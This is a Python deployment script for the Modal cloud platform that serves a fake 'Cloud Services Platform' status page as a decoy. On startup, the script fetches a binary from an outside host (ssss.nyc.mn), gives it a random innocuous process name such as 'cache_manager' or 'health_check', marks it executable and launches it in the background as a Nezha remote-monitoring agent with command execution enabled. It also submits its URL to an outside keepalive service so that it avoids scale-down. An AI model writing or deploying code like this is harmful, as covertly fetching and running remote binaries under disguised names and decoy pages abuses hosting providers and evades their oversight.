import os
import json
import time
import subprocess
import platform
import random
import threading
from fastapi import FastAPI, Response, Request
from fastapi.responses import HTMLResponse
import modal

# ========== Modal 配置 ==========
DEPLOY_REGION = os.environ.get('DEPLOY_REGION', 'us-east')  # 从环境变量读取，默认美国东部
APP_NAME = os.environ.get('MODAL_APP_NAME', 'app')         # 从环境变量读取自定义名称，默认为 "app"

# ========== Modal 镜像定义 ==========
image = modal.Image.debian_slim().pip_install(
    "fastapi==0.115.12",
    "pydantic==2.11.7",
    "requests",
    "psutil",
    "uvicorn",
)

# 使用动态名称创建 App
app = modal.App(APP_NAME, image=image)

# ========== FastAPI 实例 ==========
web_app = FastAPI(
    title="Cloud Services Platform",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

# ========== 全局启动控制 ==========
_agent_started = False
_agent_lock = threading.Lock()
_keepalive_started = False
_keepalive_lock = threading.Lock()
_project_url = None

# ========== 伪装页面 HTML ==========
FAKE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oracle Cloud Infrastructure</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 48px;
            max-width: 580px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            text-align: center;
        }
        .logo {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo svg { width: 36px; height: 36px; fill: white; }
        h1 {
            font-size: 24px;
            color: #1a1a2e;
            margin-bottom: 8px;
            font-weight: 700;
        }
        .subtitle {
            color: #6b7280;
            font-size: 15px;
            margin-bottom: 32px;
            line-height: 1.6;
        }
        .status-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 32px;
        }
        .status-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 20px 16px;
            text-align: center;
        }
        .status-card .icon { font-size: 28px; margin-bottom: 8px; }
        .status-card .label {
            font-size: 12px;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
        }
        .status-card .value {
            font-size: 16px;
            font-weight: 600;
            color: #1e293b;
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #ecfdf5;
            color: #059669;
            padding: 8px 20px;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 24px;
        }
        .status-badge .dot {
            width: 8px;
            height: 8px;
            background: #059669;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        .footer {
            color: #9ca3af;
            font-size: 13px;
            line-height: 1.8;
        }
        .divider { height: 1px; background: #e5e7eb; margin: 24px 0; }
        .tech-stack {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 16px;
        }
        .tech-item { font-size: 12px; color: #9ca3af; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/>
            </svg>
        </div>
        <h1>Cloud Services Platform</h1>
        <p class="subtitle">Enterprise-grade cloud infrastructure powering your applications with high availability and global reach.</p>
        <div class="status-badge">
            <span class="dot"></span>
            All Systems Operational
        </div>
        <div class="status-grid">
            <div class="status-card">
                <div class="icon">⚡</div>
                <div class="label">Uptime</div>
                <div class="value">99.97%</div>
            </div>
            <div class="status-card">
                <div class="icon">🌍</div>
                <div class="label">Regions</div>
                <div class="value">12 Active</div>
            </div>
            <div class="status-card">
                <div class="icon">🔒</div>
                <div class="label">Security</div>
                <div class="value">TLS 1.3</div>
            </div>
            <div class="status-card">
                <div class="icon">📊</div>
                <div class="label">Latency</div>
                <div class="value">&lt;50ms</div>
            </div>
        </div>
        <div class="divider"></div>
        <div class="footer">
            <p>&copy; 2025 Cloud Services Platform. All rights reserved.</p>
            <p>Powered by distributed cloud architecture</p>
            <div class="tech-stack">
                <span class="tech-item">Kubernetes</span>
                <span class="tech-item">Docker</span>
                <span class="tech-item">Terraform</span>
                <span class="tech-item">gRPC</span>
            </div>
        </div>
    </div>
</body>
</html>"""

# ========== 辅助函数 ==========

def create_directory(file_path):
    if not os.path.exists(file_path):
        os.makedirs(file_path, exist_ok=True)
        print(f"Directory created: {file_path}")

def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    return 'amd'

def download_file(file_name, file_url, file_path):
    import requests
    try:
        full_path = os.path.join(file_path, file_name)
        print(f"Downloading {file_url} -> {full_path}")
        response = requests.get(file_url, stream=True, timeout=60)
        response.raise_for_status()
        with open(full_path, 'wb') as f:
            total = 0
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                total += len(chunk)
        print(f"Download complete: {total} bytes written to {full_path}")
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
            print(f"Permissions set for {file_path}")
        except Exception as e:
            print(f"Chmod failed for {file_path}: {e}")
    else:
        print(f"File not found for chmod: {file_path}")

def write_log(message):
    try:
        with open('/tmp/agent.log', 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
    except Exception:
        pass

def exec_cmd(command):
    try:
        write_log(f"Executing: {command}")
        with open('/tmp/agent.log', 'a') as f:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=f,
                stderr=f,
                start_new_session=True,
            )
        write_log(f"Process started with PID: {process.pid}")
        return process.pid
    except Exception as e:
        write_log(f"Command execution failed: {e}")
        print(f"Command execution failed: {e}")
        return None

def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
    if not nezha_server or not nezha_key:
        msg = "NEZHA_SERVER or NEZHA_KEY is missing, agent will not start."
        print(msg)
        write_log(msg)
        return

    architecture = get_system_architecture()
    print(f"Detected architecture: {architecture}")
    write_log(f"Architecture: {architecture}")

    disguise_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    disguise_name = random.choice(disguise_names)
    print(f"Using disguise name: {disguise_name}")
    write_log(f"Disguise name: {disguise_name}")

    if nezha_port:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/agent"
        else:
            url = "https://amd64.ssss.nyc.mn/agent"
    else:
        if architecture == 'arm':
            url = "https://arm64.ssss.nyc.mn/v1"
        else:
            url = "https://amd64.ssss.nyc.mn/v1"

    print(f"Download URL: {url}")
    write_log(f"Download URL: {url}")

    if not download_file(disguise_name, url, file_path):
        msg = "Download failed, agent not started."
        print(msg)
        write_log(msg)
        return

    agent_path = os.path.join(file_path, disguise_name)
    authorize_files(agent_path)

    if os.path.exists(agent_path):
        file_size = os.path.getsize(agent_path)
        print(f"Agent file size: {file_size} bytes")
        write_log(f"Agent file size: {file_size} bytes")
        if file_size < 1000:
            msg = "Agent file too small, possibly corrupted."
            print(msg)
            write_log(msg)
            return
    else:
        msg = "Agent file does not exist after download."
        print(msg)
        write_log(msg)
        return

    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if nezha_port:
        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
        command = (
            f"nohup {agent_path} "
            f"-s {nezha_server}:{nezha_port} "
            f"-p {nezha_key} "
            f"{nezha_tls_flag} "
            f">/dev/null 2>&1 &"
        )
    else:
        port = ""
        if ":" in nezha_server:
            port = nezha_server.split(":")[-1]
        nezha_tls = "true" if port in tls_ports else "false"

        config_yaml = (
            f"client_secret: {nezha_key}\n"
            f"debug: false\n"
            f"disable_auto_update: true\n"
            f"disable_command_execute: false\n"
            f"disable_force_update: true\n"
            f"disable_nat: false\n"
            f"disable_send_query: false\n"
            f"gpu: false\n"
            f"insecure_tls: false\n"
            f"ip_report_period: 1800\n"
            f"report_delay: 4\n"
            f"server: {nezha_server}\n"
            f"skip_connection_count: false\n"
            f"skip_procs_count: false\n"
            f"temperature: false\n"
            f"tls: {nezha_tls}\n"
            f"use_gitee_to_upgrade: false\n"
            f"use_ipv6_country_code: false\n"
            f"uuid: {uuid}\n"
        )

        config_path = os.path.join(file_path, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        print(f"Config written to {config_path}")
        write_log(f"Config written to {config_path}")

        command = (
            f"nohup {agent_path} "
            f"-c \"{config_path}\" "
            f">/dev/null 2>&1 &"
        )

    print(f"Starting agent: {command}")
    write_log(f"Starting agent: {command}")
    pid = exec_cmd(command)
    if pid:
        print(f"Agent process launched, PID: {pid}")
        write_log(f"Agent process launched, PID: {pid}")
    else:
        print("Failed to launch agent process.")
        write_log("Failed to launch agent process.")

def tail_log(filepath, lines=10):
    try:
        with open(filepath, 'r') as f:
            all_lines = f.read().splitlines()
            return all_lines[-lines:] if len(all_lines) >= lines else all_lines
    except FileNotFoundError:
        return ["Log file not found"]
    except Exception as e:
        return [f"Error reading log: {str(e)}"]

def find_agent_processes():
    import psutil
    agent_names = [
        'cache_manager',
        'session_handler',
        'task_worker',
        'log_rotator',
        'health_check',
    ]
    found = []
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            cmdline = ' '.join(proc.info.get('cmdline') or [])
            name = proc.info.get('name', '')
            if any(n in cmdline or n in name for n in agent_names):
                found.append({
                    "pid": proc.info['pid'],
                    "name": proc.info.get('name', 'unknown'),
                    "status": proc.info.get('status', 'unknown'),
                })
        except Exception:
            continue
    return found

# ========== 自动保活功能 ==========

def get_project_url():
    global _project_url
    if _project_url:
        return _project_url
    return os.environ.get('PROJECT_URL', '')

def auto_detect_url(request: Request):
    global _project_url
    if _project_url:
        return

    scheme = request.headers.get('x-forwarded-proto', 'https')
    host = request.headers.get('host', '')

    if host:
        detected = f"{scheme}://{host}"
        _project_url = detected
        msg = f"Auto-detected PROJECT_URL: {_project_url}"
        print(msg)
        write_log(msg)
        start_keepalive()

def add_visit_task(project_url):
    import requests
    try:
        response = requests.post(
            'https://trans.alwaysdata.net/add-url',
            json={"url": project_url},
            headers={'Content-Type': 'application/json'},
            timeout=30,
        )
        response.raise_for_status()
        msg = f"Automatic access task added successfully for {project_url}"
        print(msg)
        write_log(msg)
        return True
    except Exception as e:
        msg = f"Add automatic access task failed: {e}"
        print(msg)
        write_log(msg)
        return False

def self_keepalive_loop(project_url, interval=120):
    import requests
    health_url = project_url.rstrip('/') + '/health'
    while True:
        try:
            time.sleep(interval + random.randint(0, 30))
            response = requests.get(health_url, timeout=30)
            msg = f"Self keepalive ping: {health_url} -> {response.status_code}"
            print(msg)
            write_log(msg)
        except Exception as e:
            msg = f"Self keepalive ping failed: {e}"
            print(msg)
            write_log(msg)

def start_keepalive():
    global _keepalive_started
    with _keepalive_lock:
        if _keepalive_started:
            return
        _keepalive_started = True

    project_url = get_project_url()
    if not project_url:
        msg = "PROJECT_URL is empty, keepalive will not start yet."
        print(msg)
        write_log(msg)
        with _keepalive_lock:
            _keepalive_started = False
        return

    auto_access = os.environ.get('AUTO_ACCESS', 'true').lower()
    keepalive_interval = int(os.environ.get('KEEPALIVE_INTERVAL', '120'))

    print(f"Starting keepalive for: {project_url}")
    write_log(f"Starting keepalive for: {project_url}")

    if auto_access in ('true', '1', 'yes'):
        task_thread = threading.Thread(
            target=add_visit_task,
            args=(project_url,),
            daemon=True,
        )
        task_thread.start()
        print("External keepalive task submitted to trans.ct8.pl")
        write_log("External keepalive task submitted to trans.ct8.pl")

    keepalive_thread = threading.Thread(
        target=self_keepalive_loop,
        args=(project_url, keepalive_interval),
        daemon=True,
    )
    keepalive_thread.start()
    print(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")
    write_log(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")

def ensure_agent_started():
    global _agent_started
    with _agent_lock:
        if _agent_started:
            print("Agent already started, skipping.")
            return
        _agent_started = True

    print("=" * 50)
    print("Initializing Nezha Agent...")
    print("=" * 50)

    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
    NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
    UUID = os.environ.get('UUID', '')

    print(f"FILE_PATH:      {FILE_PATH}")
    print(f"NEZHA_SERVER:   {NEZHA_SERVER}")
    print(f"NEZHA_PORT:     {NEZHA_PORT}")
    print(f"NEZHA_KEY:      {'***' + NEZHA_KEY[-4:] if len(NEZHA_KEY) > 4 else '(empty)'}")
    print(f"UUID:           {UUID}")

    write_log("=" * 40)
    write_log("Agent initialization started")
    write_log(f"FILE_PATH: {FILE_PATH}")
    write_log(f"NEZHA_SERVER: {NEZHA_SERVER}")
    write_log(f"NEZHA_PORT: {NEZHA_PORT}")
    write_log(f"UUID: {UUID}")

    create_directory(FILE_PATH)

    def agent_starter():
        try:
            run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
        except Exception as e:
            msg = f"Agent starter thread exception: {e}"
            print(msg)
            write_log(msg)

    thread = threading.Thread(target=agent_starter, daemon=True)
    thread.start()
    print("Agent starter thread launched.")

# ========== FastAPI 中间件 ==========
@web_app.middleware("http")
async def detect_url_middleware(request: Request, call_next):
    auto_detect_url(request)
    response = await call_next(request)
    return response

# ========== FastAPI 启动事件 ==========
@web_app.on_event("startup")
async def startup_event():
    print("FastAPI startup event fired.")
    print(f"Deploy Region: {DEPLOY_REGION} (from environment)")
    print(f"App Name: {APP_NAME}")
    ensure_agent_started()

# ========== FastAPI 路由 ==========
@web_app.get("/")
async def root():
    return HTMLResponse(content=FAKE_HTML)

@web_app.get("/health")
async def health():
    data = {
        "status": "healthy",
        "timestamp": time.time(),
        "uptime": time.ctime(),
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/status")
async def status():
    processes = find_agent_processes()
    if processes:
        data = {
            "agent_status": "running",
            "processes": processes,
            "process_count": len(processes),
        }
    else:
        data = {
            "agent_status": "not_running",
            "processes": [],
            "process_count": 0,
            "recent_logs": tail_log('/tmp/agent.log', lines=5),
        }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/logs")
async def logs():
    log_lines = tail_log('/tmp/agent.log', lines=30)
    data = {
        "log_lines": len(log_lines),
        "logs": log_lines,
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/info")
async def info():
    import psutil
    data = {
        "platform": platform.platform(),
        "architecture": platform.machine(),
        "python_version": platform.python_version(),
        "deploy_region": DEPLOY_REGION,
        "app_name": APP_NAME,
        "cpu_count": psutil.cpu_count(),
        "memory_total_mb": round(psutil.virtual_memory().total / 1024 / 1024, 2),
        "memory_used_mb": round(psutil.virtual_memory().used / 1024 / 1024, 2),
        "memory_percent": psutil.virtual_memory().percent,
        "disk_total_gb": round(psutil.disk_usage('/').total / 1024 / 1024 / 1024, 2),
        "disk_used_gb": round(psutil.disk_usage('/').used / 1024 / 1024 / 1024, 2),
        "disk_percent": psutil.disk_usage('/').percent,
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/keepalive")
async def keepalive_status():
    project_url = get_project_url()
    data = {
        "keepalive_started": _keepalive_started,
        "project_url": project_url or "not detected yet",
        "auto_detected": bool(_project_url),
        "auto_access": os.environ.get('AUTO_ACCESS', 'true'),
        "keepalive_interval": int(os.environ.get('KEEPALIVE_INTERVAL', '120')),
        "recent_logs": [
            line for line in tail_log('/tmp/agent.log', lines=20)
            if 'keepalive' in line.lower() or 'automatic access' in line.lower()
            or 'auto-detected' in line.lower()
        ],
    }
    return Response(content=json.dumps(data), media_type="application/json")

@web_app.get("/restart")
async def restart_agent():
    import psutil
    global _agent_started
    killed = []
    processes = find_agent_processes()
    for proc_info in processes:
        try:
            proc = psutil.Process(proc_info['pid'])
            proc.kill()
            killed.append(proc_info['pid'])
        except Exception:
            pass
    with _agent_lock:
        _agent_started = False
    time.sleep(2)
    ensure_agent_started()
    data = {
        "action": "restart",
        "killed_pids": killed,
        "message": "Agent restart initiated",
    }
    return Response(content=json.dumps(data), media_type="application/json")

# ========== Modal 入口（指定区域和并发）==========
selected_region = os.environ.get('DEPLOY_REGION', 'us-east')

@app.function(
    secrets=[modal.Secret.from_name("nezha-secrets")],
    scaledown_window=300,
    region=[selected_region],
)
@modal.concurrent(max_inputs=10)
@modal.asgi_app()
def fastapi_app():
    return web_app
